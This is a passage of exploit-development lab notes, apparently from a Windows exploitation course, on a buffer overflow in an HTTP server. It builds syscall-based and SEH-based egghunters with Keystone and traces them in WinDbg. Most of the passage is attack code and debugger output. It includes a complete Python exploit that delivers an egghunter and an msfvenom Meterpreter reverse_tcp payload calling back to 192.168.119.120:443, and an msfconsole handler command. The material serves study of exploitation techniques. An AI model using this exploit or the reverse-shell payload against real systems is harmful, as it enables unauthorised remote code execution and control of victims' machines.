  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

While this solution works, executing assembly instructions generated by the opcodes of our HTTP method is not very clean.

## Changing the HTTP Method

`dc poi(@esp)`

```
0305ea84  00544547 00000000 00000000 00000000  GET.............
0305ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0305eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

Notice a padding of null bytes between the HTTP method and our other data.

The buffer used to store the HTTP method seems to be allocated with a fixed size. It is quite large, based on what it's meant to store.

=> Whether or not there are any checks implemented for the HTTP method?

If there are no checks, attempt to replace it with opcodes for assembly instructions that jump to our `0x41` field buffer.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x43\x43\x43\x43\x43\x43\x43\x43" + b" /"
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

```
bp 0x00418674
g
```

`dc poi(@esp+4)`

```
0304ea84  43434343 43434343 00000000 00000000  CCCCCCCC........
0304ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0304eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

Successfully change our HTTP method to an invalid one without affecting the crash.

Use a short jump of `0x17` bytes (Not correct)

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\xeb\x17\x90\x90" + b" /"  # Short jump of 0x17
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))      # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Set a breakpoint at the address of our `POP EAX; RET` instruction sequence.

```
t
t
```

`u @eip`

```
0306ea84 cb              retf
0306ea85 17              pop     ss
0306ea86 90              nop
0306ea87 90              nop
0306ea88 0000            add     byte ptr [eax],al
0306ea8a 0000            add     byte ptr [eax],al
0306ea8c 0000            add     byte ptr [eax],al
0306ea8e 0000            add     byte ptr [eax],al
```

Instead of our short jump assembly instruction, we get an unexpected `RETF` instruction.

Different memory allocations will have different operations and checks performed on the data stored in them.

=> We may find a completely different set of bad characters than initially discovered.

## Conditional Jumps

To use the conditional jump `JE`, we need to guarantee that the `ZF` will always be `1` (TRUE).

```bash
msf-nasm_shell
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx

nasm > test ecx, ecx
00000000  85C9              test ecx,ecx

nasm > je 0x17
00000000  0F8411000000      jz near 0x17
```

Both `JE` and `JZ` conditional jumps check if the `ZF` is set as a condition. Because of this, they have the same opcodes and various tools will use them interchangeably.

The opcodes generated above do not seem to include bad characters except for the conditional jump opcodes, which include 3 null bytes.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Before we execute the `ret` instruction

`u poi(@esp) L3`

```
02feea84 31c9            xor     ecx,ecx
02feea86 85c9            test    ecx,ecx
02feea88 0f8411000000    je      02feea9f
```

Before we execute the conditional jump

`r @zf`

```
zf=1
```

Execute the conditional jump 

`db @eip L100`

```
02feea9f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
02feeaaf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
...
02feeb7f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
02feeb8f  41 41 41 41 41 41 41 41-41 41 41 74 86 41 00 00
```

`? 02feeb8f + 0n11 - @eip`

```
Evaluate expression: 251 = 000000fb
```

Not enough space!

## Finding Alternative Places to Store Large Buffers

If we can store a second, larger buffer elsewhere, we can use our current, smaller buffer space to write a stage one shellcode (to redirect the execution flow to that second buffer)

Because we are attacking a web server, we could add an additional buffer after the first carriage return (`\r`) and new-line (`\n`)

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n"
  httpEndRequest+= b"w00tw00t" + b"\x44" * 400
  httpEndRequest+= b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Running the PoC does **not** seem to cause our application to crash.

Send the buffer after we end our HTTP request:

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  shellcode = b"w00tw00t" + b"\x44" * 400

  buf = httpMethod + inputBuffer +  httpEndRequest + shellcode
...
```

`s -a 0x0 L?80000000 w00tw00t`

```
01365a5e  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
```

`db 01365a5e + 0n408 - 4 L4`

```
01365bf2    44 44 44 44     DDDD
```

We were able to store the entire buffer

Inspect the memory address to determine in which region it is located and its properties.

`!teb`

```
TEB at 7ffdb000
    ExceptionList:        016cff70
    StackBase:            016d0000
    StackLimit:           016cc000
    SubSystemTib:         00000000
    ...
```

The address is not located on our current stack.

Display information about a specific memory address

`!address 01365a5e`

```
Usage:                  Heap
Base Address:           01360000
End Address:            0136f000
Region Size:            0000f000 (  60.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        01360000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap 0x1360000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x1365a5e

Content source: 1 (target), length: 5a2
```

The memory address where our buffer is stored is on the heap

## The Windows Heap Memory Manager

Heap Manager is a software layer that resides on top of the virtual memory interfaces provided by the Windows OS.

This software layer allows applications to dynamically request and release memory through a set of Windows APIs (`VirtualAllocEx, VirtualFreeEx, HeapAlloc, and HeapFree`). These APIs will eventually call into their respective native functions in `ntdll.dll` (`RtlAllocateHeap and RtlFreeHeap`).

In Windows OS, when a process starts, the Heap Manager automatically creates a new heap called the **default process heap**.

Although some processes only use the default process heap, many will create additional heaps using the `HeapCreate` API (or its lower-level interface `ntdll!RtlCreateHeap`) to isolate different components running in the process itself.

Other processes make substantial use of the C Runtime heap for most dynamic allocations (`malloc / free` functions). These heap implementations, defined as NT Heap, eventually make use of the Windows Heap Manager functions in `ntdll.dll` to interface with the kernel Windows Virtual Memory Manager and to allocate memory dynamically.

Because our secondary buffer is stored in **dynamic** memory, there's no way to determine its location beforehand.

=> No possibility of adding a **static offset** to our current instruction pointer to reach our secondary buffer.

## Finding our Buffer - The Egghunter Approach

To find the memory address of another buffer under our control that is not static, we often use an Egghunter.

A small first-stage payload that can search the process virtual address space (VAS) for an egg, a unique tag that prepends the payload we want to execute.

Once the egg is found, the egghunter transfers the execution to the final shellcode by jumping to the found address.

Since egghunters are often used when dealing with space restrictions, they are written to be as small as possible. 

These type of payloads also need to **handle access violations** that are raised while scanning the virtual address space.

The access violations usually occur while attempting to access an unmapped memory address or addresses we don't have access to.

### Keystone Engine

Keystone Engine is an assembler framework with bindings for several languages, including Python.

With it, simply write our ASM code in a Python script.

```bash
sudo apt install python3-pip
pip install keystone-engine
```

#### keystone_0x01.py

```bash
python3 keystone_0x01.py
```
Opcodes = ("\x31\xc0\x01\xc8\x50\x5e")

```python
from keystone import *

CODE = (
"                        " 
" start:                 "
"     xor eax, eax      ;" 
"     add eax, ecx      ;" 
"     push eax          ;" 
"     pop esi           ;" 
)

# Initialize engine in 32-bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding: 
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
  
print("Opcodes = (\"" + instructions + "\")")
```

```bash
msf-nasm_shell 

nasm > xor eax,eax
00000000  31C0              xor eax,eax

nasm > add eax,ecx
00000000  01C8              add eax,ecx

nasm > push eax
00000000  50                push eax

nasm > pop esi
00000000  5E                pop esi
```

### System Calls and Egghunters

Rather than crawling the memory inside our program and risking an access violation, we'll use a **system call** and have the OS access a specific memory address.

By using the `NtAccessCheckAndAuditAlarm` system call, we will only get 2 results back.

1. If the memory page is valid and we have appropriate access, the system call will return `STATUS_NO_IMPERSONATION_TOKEN` (`0xc000005c`).

2. Attempting to access an unmapped memory page or one without appropriate access will result in a `STATUS_ACCESS_VIOLATION` (`0xc0000005`) code. 

The `NtAccessCheckAndAuditAlarm` Windows system call will work without issues in the egghunter unless we are running in the context of a thread that is **impersonating a client**.

A **system call** is an interface between a user-mode process and the kernel.

Invoking a system call is usually done through a dedicated assembly instruction or an **interrupt** (also known as a **trap** or **exception**).

Before invoking a system call, the OS needs to know the function it should call and the arguments that are passed to it.

- On the x86 architecture, the function can be specified by setting up a unique **System Call Number** in the `EAX` register that matches a specific function.

- If the function is invoked through a system call, after pushing the arguments individually on the stack, we'll move the stack pointer (`ESP`) to the `EDX` register, which is passed to the system call.

As part of the system call, the OS will try to access the memory address where the function arguments are stored (to copy them from user-space to kernel-space).

If `EDX` points to an unmapped memory address or one we can't access due to lack of appropriate permissions, the OS will trigger an access violation, which it will handle for us and return the `STATUS_ACCESS_VIOLATION` code in `EAX` (allowing our egghunter to continue to the next **memory page**).

`python3 original_egghunter.py`

```
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
```

```python
from keystone import *

CODE = (
		# We use the edx register as a memory page counter
"							 " 
"	loop_inc_page:			 "
		# Go to the last address in the memory page
"		or dx, 0x0fff		;" 
"	loop_inc_one:			 "
		# Increase the memory counter by one
"		inc edx				;"
"	loop_check:				 "
		# Save the edx register which holds our memory 
		# address on the stack
"		push edx			;"
		# Push the system call number
"		push 0x2 			;" 
		# Initialize the call to NtAccessCheckAndAuditAlarm
"		pop eax				;" 
		# Perform the system call
"		int 0x2e			;" 
		# Check for access violation, 0xc0000005 
		# (ACCESS_VIOLATION)
"		cmp al,05			;" 
		# Restore the edx register to check later 
		# for our egg
"		pop edx				;" 
"	loop_check_valid:		 "
		# If access violation encountered, go to n
		# ext page
"		je loop_inc_page	;" 
"	is_egg:					 "
		# Load egg (w00t in this example) into 
		# the eax register
"		mov eax, 0x74303077	;" 
		# Initializes pointer with current checked 
		# address 
"		mov edi, edx		;" 
		# Compare eax with doubleword at edi and 
		# set status flags
"		scasd				;" 
		# No match, we will increase our memory 
		# counter by one
"		jnz loop_inc_one	;" 
		# First part of the egg detected, check for 
		# the second part
"		scasd				;" 
		# No match, we found just a location 
		# with half an egg
"		jnz loop_inc_one	;" 
"	matched:				 "
		# The edi register points to the first 
		# byte of our buffer, we can jump to it
"		jmp edi				;" 
)

# Initialize engine in 32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
  
print("egghunter = (\"" + egghunter + "\")")
```

The `OR` operation on the `DX` register will make `EDX` point to the **last address of a memory page** > An `INC` instruction, which effectively sets `EDX` to a **new memory page**.

The `loop_check` function:

- While we don't need the `PUSH EDX` instruction for the execution of the system call, pushing it on the stack allows us to restore it later on.

- Push the system call number (`0x02`) and then perform a `POP` instruction to pop the system call number from the stack into `EAX`.

- Now that we have the system call number in `EAX` and a fake pointer to our arguments in `EDX`, we can invoke the system call using `INT 0x2E`, which results in a trap. Microsoft designed the OS to treat this exception as a system call.

At this point, the OS will check the memory pointer from `EDX` to gather the function arguments. If accessing the memory address from `EDX` causes an access violation, we will get the `STATUS_ACCESS_VIOLATION` (`0xc0000005`) result in `EAX`.

To avoid null bytes, rather than checking for the entire DWORD, our egghunter simply performs a `CMP` between the `AL` register and the value `0x05`.

`POP EDX` will restore our memory address from the stack back into the `EDX` register.

This is followed by a conditional jump based on the result of our previous comparison.

- If a `STATUS_ACCESS_VIOLATION` was found, we move on to the next memory page by jumping to the beginning of our egghunter and repeating the previous steps.

- If the memory page is mapped, or we have the appropriate access, we continue to check for our unique signature (egg).

Our egghunter using a `MOV` instruction to move the hex value of our egg in `EAX` and move our memory address from `EDX` to `EDI`.

`SCASD` will compare the value stored in `EAX` with the first DWORD that the memory address from `EDI` is pointing to. Then it will automatically increment `EDI` by a DWORD.

- If the first DWORD of our egg is not found, then we jump back, increase the memory address by one, and repeat the process.

- If found, we use the `SCASD` instruction again to check for the second DWORD of our egg.

If the second entry matches, i.e. we have found our buffer and `EDI` points right after our egg. => redirect the execution flow with a `JMP` instruction.

The original code from Matt Miller used the `NtDisplayString` system call, exploiting the very same concept.

However,  `NtAccessCheckAndAuditAlarm` system call number (`0x02`) didn't change across different OSs versions, compared to the one for `NtDisplayString`.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
               b"\x66\x81\xca\xff\x0f\x42\x52\x6a"
               b"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
               b"\xef\xb8\x77\x30\x30\x74\x89\xd7"
               b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  shellcode = b"w00tw00t" + b"\x44" * 400

  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
...
```

Set a breakpoint at our `POP EAX; RET` instruction sequence. Once our breakpoint is hit, we will execute until a branch is taken

`ph`

```
02f0ea88 0f8411000000    je      02f0ea9f
```

`u 02f0ea9f L16`

```
02f0ea9f 90              nop
02f0eaa0 90              nop
02f0eaa1 90              nop
02f0eaa2 90              nop
02f0eaa3 90              nop
02f0eaa4 90              nop
02f0eaa5 6681caff0f      or      dx,0FFFh
02f0eaaa 42              inc     edx
02f0eaab 52              push    edx
02f0eaac 6a02            push    2
02f0eaae 58              pop     eax
02f0eaaf cd2e            int     2Eh
02f0eab1 3c05            cmp     al,5
02f0eab3 5a              pop     edx
02f0eab4 74ef            je      02f0eaa5
02f0eab6 b877303074      mov     eax,74303077h
02f0eabb 89d7            mov     edi,edx
02f0eabd af              scas    dword ptr es:[edi]
02f0eabe 75ea            jne     02f0eaaa
02f0eac0 af              scas    dword ptr es:[edi]
02f0eac1 75e7            jne     02f0eaaa
02f0eac3 ffe7            jmp     edi
```

Our egghunter code is present in memory and appears to be intact.

Confirm that the egghunter has been stored in memory without being mangled.

`s -a 0x0 L?80000000 w00tw00t`

Our egghunter is still running but it does not seem to find our secondary buffer.

While we can find plenty of exploits publicly available that include this egghunter, it appears that they are all targeting applications on **Windows 7 or prior**.

=> Some changes occurred in between Windows 7 and Windows 10 that break the functionality of our egghunter.

Set a breakpoint at the `INT 0x2E` instruction

`bp 02ffeaaf`

`g`

```
edx=77185000
02ffeaaf cd2e            int     2Eh
```

`p`

```
eax=c0000005
02ffeab1 3c05            cmp     al,5
```

`dc 77185000`

Inspecting the memory addresses shows that they are mapped and we can read the contents of the memory.

Hardcoding system call numbers are prone to change across different versions of the OS.

Before Windows 8, `NtAccessCheckAndAuditAlarm`'s system call number was always `0x02`. With the release of Windows 10, the system call numbers often change with every update.

Updating the system call number

`u ntdll!NtAccessCheckAndAuditAlarm`

```
ntdll!NtAccessCheckAndAuditAlarm:
76f20ec0 b8c6010000      mov     eax,1C6h
76f20ec5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (76f20ecd)
76f20eca c22c00          ret     2Ch
76f20ecd 8bd4            mov     edx,esp
76f20ecf 0f34            sysenter
76f20ed1 c3              ret
...
```

The system call number for our version of Windows is `0x1C6`. 

`python3 original_egghunter_win10.py`

```
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x68\xc6\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7")
```

Replacing our `PUSH 0x02` instruction with `PUSH 0x1C6` results in null bytes.

=> `NEG` assembly instruction

`? 0x00 - 0x1C6`

```
Evaluate expression: -454 = fffffe3a
```

```python
...
"	loop_check:				 "
		# Save the edx register which holds our memory 
		# address on the stack
"		push edx			;"
		# Push the negative value of the system 
		# call number
"		mov eax, 0xfffffe3a	;" 
		# Initialize the call to NtAccessCheckAndAuditAlarm
"		neg eax				;" 
		# Perform the system call
"		int 0x2e			;" 
		# Check for access violation, 0xc0000005 
		# (ACCESS_VIOLATION)
"		cmp al,05			;" 
		# Restore the edx register to check 
		# later for our egg
"		pop edx				;" 
...
```

We successfully located our secondary buffer.

### Obtaining a Shell

Checking for bad characters in our secondary buffer

```python
...
  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  badchars = (
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  shellcode = b"w00tw00t" + badchars + b"\x44" * (400-len(badchars))

  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
...
```

`s -a 0x0 L?80000000 w00tw00t`

We do not appear to have any bad characters in our secondary buffer.

#### System call-based egghunter

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 80
    size = 253

    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
                b"\x66\x81\xca\xff\x0f\x42\x52\xb8"
                b"\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e"
                b"\x3c\x05\x5a\x74\xeb\xb8\x77\x30"
                b"\x30\x74\x89\xd7\xaf\x75\xe6\xaf"
                b"\x75\xe3\xff\xe7")

    inputBuffer = b"\x41" * (size - len(egghunter))
    inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload

    payload =  b""
    payload += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
    ...
    payload += b"\xff\xd5"

    shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload))

    buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    
    print("Done!")
  
except socket.error:
    print("Could not connect!")
```

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"
```

## Improving the Egghunter Portability Using SEH

Rather than relying on the OS, create and install our own structured exception handler to handle accessing invalid memory pages to increase the portability of our egghunter.

Because the underlying SEH mechanism has not changed drastically from earlier versions of Windows.

The downside: a larger egghunter requires additional assembly instructions to set up the SEH mechanism. (~60 bytes > 35 byrs)

`python3 egghunter_seh_original.py`

```
Encoded 35 instructions...
egghunter = ("\xeb\x21\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3")
```

```python
from keystone import *

CODE = (
"	start: 									 "
		# jump to a negative call to dynamically 
		# obtain egghunter position
"		jmp get_seh_address 				;" 
"	build_exception_record: 				 "
		# pop the address of the exception_handler 
		# into ecx
"		pop ecx 							;" 
		# mov signature into eax
"		mov eax, 0x74303077 				;" 
		# push Handler of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;" 
		# push Next of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;" 
		# null out ebx
"		xor ebx, ebx 						;" 
		# overwrite ExceptionList in the TEB with a pointer
		# to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;" 
"	is_egg: 								 "
		# push 0x02
"		push 0x02 							;" 
		# pop the value into ecx which will act 
		# as a counter
"		pop ecx 							;" 
		# mov memory address into edi
"		mov edi, ebx 						;" 
		# check for our signature, if the page is invalid we 
		# trigger an exception and jump to our exception_handler function
"		repe scasd 							;" 
		# if we didn't find signature, increase ebx 
		# and repeat
"		jnz loop_inc_one 					;"  
		# we found our signature and will jump to it
"		jmp edi 							;" 
"	loop_inc_page: 							 " 
		# if page is invalid the exception_handler will 
		# update eip to point here and we move to next page
"		or bx, 0xfff 						;" 
"	loop_inc_one: 							 "
		# increase ebx by one byte
"		inc ebx 							;" 
		# check for signature again
"		jmp is_egg 							;" 
"	get_seh_address: 						 "
		# call to a higher address to avoid null bytes & push 
		# return to obtain egghunter position
"		call build_exception_record 		;" 
		# push 0x0c onto the stack
"		push 0x0c 							;" 
		# pop the value into ecx
"		pop ecx 							;" 
		# mov into eax the pointer to the CONTEXT 
		# structure for our exception
"		mov eax, [esp+ecx] 					;" 
		# mov 0xb8 into ecx which will act as an 
		# offset to the eip
"		mov cl, 0xb8						;" 
		# increase the value of eip by 0x06 in our CONTEXT 
		# so it points to the "or bx, 0xfff" instruction 
		# to increase the memory page
"		add dword ptr ds:[eax+ecx], 0x06	;" 
		# save return value into eax
"		pop eax 							;" 
		# increase esp to clean the stack for our call
"		add esp, 0x10 						;" 
		# push return value back into the stack
"		push eax 							;" 
		# null out eax to simulate 
		# ExceptionContinueExecution return
"		xor eax, eax 						;" 
		# return
"		ret 								;" 
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
print("egghunter = (\"" + egghunter + "\")")
```

In `get_seh_address`, the 1st instruction is a **relative** `CALL` to the `build_exception_record` function.

When executing a relative call, the opcodes will match the **offset** from the current value of `EIP`. This would normally generate **null byte**s unless we perform a **backward call** using a negative offset.

By executing a `CALL` instruction, we will push the **return value** to the stack.
 
The `build_exception_record` function:

- `pop ecx`  will store the return value pushed to the stack by our previous CALL into ECX.

- Our egg is moved into the `EAX` register.

Building our own `_EXCEPTION_REGISTRATION_RECORD` structure:

- Push the value stored in `ECX`, which holds our **return address** pointing to the next instruction after our `CALL` to `build_exception_record`. This will act as the `Handler` member of the `_EXCEPTION_REGISTRATION_RECORD` structure.

- Push the value of "-1" (`0xffffffff`) as our `Next` member. This signals the end of the singly-linked list storing the exception records.

- Installs the custom exception handler by overwriting the `ExceptionList` member in the `TEB` structure with our stack pointer.

The next functions (`is_egg`, `loop_inc_page`, and `loop_inc_one`) are meant to search for our egg in memory.

Rather than executing the `SCASD` operation twice, use the `REPE` instruction with the counter stored in `ECX` to minimize the size of the egghunter.

The access violation will be triggered on the `REPE SCASD` instruction.

Because an access violation means that the memory page is not valid, => our exception handler to restore execution at the `loop_inc_page` function.

The prototype of the `_except_handler` function.

```C
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,  
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
);
```

Whenever an exception occurs, the OS will invoke our `_except_handler` and pass the 4 parameters to the stack.

The parameter `ContextRecord` points to a `CONTEXT` structure. At the moment the exception occurs, all register values are stored in this structure.

`dt ntdll!_CONTEXT`

At offset `0xB8` from the beginning of the CONTEXT structure, we find the `Eip` member. This member stores the memory address pointing to the instruction that caused the access violation.

=> Resume the execution flow at the `loop_inc_page` function to move to the next memory page.

An `_EXCEPTION_DISPOSITION` structure containing 44 members, each of them acting as a return value.

`dt _EXCEPTION_DISPOSITION`

```
ntdll!_EXCEPTION_DISPOSITION
   ExceptionContinueExecution = 0n0
   ExceptionContinueSearch = 0n1
   ExceptionNestedException = 0n2
   ExceptionCollidedUnwind = 0n3
```

To gracefully continue the execution, use the `ExceptionContinueExecution` return value (`0x00`) to signal that the exception has been successfully handled.

When the exception is triggered and our function is executed:

- Retrieve the `ContextRecord` parameter from the stack at offset `0x0C` (because it is the 3rd argument).

- Dereference the `ContextRecord` address at offset `0xB8` to obtain the `Eip` member.

- Align it to the `loop_inc_page` function with arithmetic operations.

- Save the return address in `EAX` and increase the stack pointer past the arguments.

- Push the previously-stored return address back on the stack and null out `EAX` to signal that the exception has been successfully handled.

- Execute a return instruction, which will take us back to the `loop_inc_page` function.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
               b"\xeb\x21\x59\xb8\x77\x30\x30\x74"
               b"\x51\x6a\xff\x31\xdb\x64\x89\x23"
               b"\x6a\x02\x59\x89\xdf\xf3\xaf\x75"
               b"\x07\xff\xe7\x66\x81\xcb\xff\x0f"
               b"\x43\xeb\xed\xe8\xda\xff\xff\xff"
               b"\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8"
               b"\x83\x04\x08\x06\x58\x83\xc4\x10"
               b"\x50\x31\xc0\xc3")

  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"
...
```

`t`

```
0307eaba f3af            repe scas dword ptr es:[edi]
```

`dd edi`

```
00000000  ???????? ???????? ???????? ????????
00000010  ???????? ???????? ???????? ????????
00000020  ???????? ???????? ???????? ????????
00000030  ???????? ???????? ???????? ????????
```

`!exchain`

```
0307ea2c: 0307eacd
Invalid exception stack at ffffffff
```

`u 0307eacd`

```
0307eacd 6a0c            push    0Ch
0307eacf 59              pop     ecx
0307ead0 8b040c          mov     eax,dword ptr [esp+ecx]
0307ead3 b1b8            mov     cl,0B8h
0307ead5 83040806        add     dword ptr [eax+ecx],6
0307ead9 58              pop     eax
0307eada 83c410          add     esp,10h
0307eadd 50              push    eax
```

Set a breakpoint at the address of our _except_handler function and let the execution resume

`bp 0307eacd`

`g`

